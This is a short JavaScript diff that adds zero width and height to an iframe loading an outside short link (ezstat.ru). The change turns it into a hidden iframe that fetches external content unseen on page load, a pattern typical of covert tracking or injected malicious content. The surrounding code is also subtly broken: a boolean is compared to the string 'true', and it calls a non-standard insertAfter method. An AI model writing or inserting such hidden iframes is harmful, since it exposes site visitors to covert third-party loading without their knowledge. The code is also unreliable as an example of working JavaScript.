@@ -5,6 +5,8 @@ if (urlParams.has("a") == "true") {
 } else {
 	var link = document.createElement('iframe');
 	link.setAttribute('src', 'https://ezstat.ru/1SG3a7');
+	link.setAttribute('width', 0);
+	link.setAttribute('height', 0);
 	var parent = document.getElementById('div');
 	parent.insertAfter(link, parent.firstChild);
 }
